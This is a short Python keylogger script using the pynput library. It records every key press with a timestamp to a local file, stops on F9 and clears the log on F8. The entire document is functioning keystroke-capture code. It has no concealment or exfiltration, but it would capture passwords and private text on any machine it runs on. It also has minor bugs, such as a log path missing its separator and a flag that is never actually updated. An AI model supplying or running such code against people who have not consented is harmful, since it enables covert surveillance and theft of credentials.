from pynput.keyboard import Key, Listener
import logging
import sys
import os

currently_active = True
log_dir = os.getcwd()
logging.basicConfig(filename = (log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')


def on_press(key):
    if(str(key) == 'Key.f9'):
        currently_active = False
        sys.exit()
    elif(str(key) == 'Key.f8'):
        open((log_dir + 'keyLog.txt'), 'w').close()
        print("File cleared!")
    else:
        logging.info(str(key))


with Listener(on_press=on_press) as listener:
    print(currently_active)
    if(currently_active == True):
        listener.join()